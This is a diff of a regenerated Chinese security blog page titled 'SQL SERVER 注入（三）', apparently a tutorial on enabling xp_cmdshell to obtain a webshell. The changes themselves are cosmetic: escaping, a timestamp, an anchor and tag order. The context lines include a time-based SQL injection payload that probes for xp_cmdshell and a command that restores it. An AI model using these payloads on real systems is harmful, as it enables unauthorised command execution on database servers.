@@ -10,13 +10,13 @@
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="开启xp_cmdshell获取webshellxp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell ;if(1=(select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; and name =&apos;xp_cmdshell">
+  <meta name="description" content="开启xp_cmdshell获取webshellxp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell ;if(1=(select count(*) from master.dbo.sysobjects where xtype = &amp;#39;x&amp;#39; and name =&amp;#39">
 <meta name="keywords" content="注入,Web安全,sql server">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL SERVER 注入（三）">
 <meta property="og:url" content="http://klforever.cn/2019/10/14/8/index.html">
 <meta property="og:site_name" content="WLSMILE Blog">
-<meta property="og:description" content="开启xp_cmdshell获取webshellxp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell ;if(1=(select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; and name =&apos;xp_cmdshell">
+<meta property="og:description" content="开启xp_cmdshell获取webshellxp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell ;if(1=(select count(*) from master.dbo.sysobjects where xtype = &amp;#39;x&amp;#39; and name =&amp;#39">
 <meta property="og:locale" content="cn">
 <meta property="og:image" content="http://klforever.cn/images/8/1.png">
 <meta property="og:image" content="http://klforever.cn/images/8/2.png">
@@ -28,10 +28,10 @@
 <meta property="og:image" content="http://klforever.cn/images/8/7.png">
 <meta property="og:image" content="http://klforever.cn/images/8/8.png">
 <meta property="og:image" content="http://klforever.cn/images/8/9.png">
-<meta property="og:updated_time" content="2021-04-25T09:07:31.200Z">
+<meta property="og:updated_time" content="2021-04-28T12:30:58.927Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL SERVER 注入（三）">
-<meta name="twitter:description" content="开启xp_cmdshell获取webshellxp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell ;if(1=(select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; and name =&apos;xp_cmdshell">
+<meta name="twitter:description" content="开启xp_cmdshell获取webshellxp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell ;if(1=(select count(*) from master.dbo.sysobjects where xtype = &amp;#39;x&amp;#39; and name =&amp;#39">
 <meta name="twitter:image" content="http://klforever.cn/images/8/1.png">
   
     <link rel="alternative" href="/atom.xml" title="WLSMILE Blog" type="application/atom+xml">
@@ -268,6 +268,7 @@
     
     <h1><span id="开启xp_cmdshell获取webshell">开启xp_cmdshell获取webshell</span></h1><p>xp_cmdshell 在 SQL server 2005 版本以上是默认关闭的，我们需要手动打开它，但在此之前我们需要进行第一步：判断是否存在组件 xp_cmdshell</p>
 <pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>select <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> from master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects where xtype <span class="token operator">=</span> <span class="token string">'x'</span> and name <span class="token operator">=</span><span class="token string">'xp_cmdshell'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> WAITFOR DELAY <span class="token string">'0:0:5'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<a id="more"></a>
 <p>如果延迟 5s后返回正常页面的话则判断存在组件 xp_cmdshell。<br>如果删除了xp_cmdshell 组件的话可以用下面的命令恢复</p>
 <pre class="line-numbers language-java"><code class="language-java">恢复／删除 xp_cmdshell
 exec sp_addextendedproc xp_cmdshell<span class="token punctuation">,</span><span class="token annotation punctuation">@dllname</span><span class="token operator">=</span><span class="token string">'xplog70.dll'</span>
@@ -596,27 +597,15 @@ RECONFIGURE<span class="token punctuation">;</span><span aria-hidden="true" clas
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">工具使用</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">工具使用</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">注入</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql server</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -629,6 +618,18 @@ RECONFIGURE<span class="token punctuation">;</span><span aria-hidden="true" clas
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">sql server</a>
               </li>
              
               <li class="article-tag-list-item">
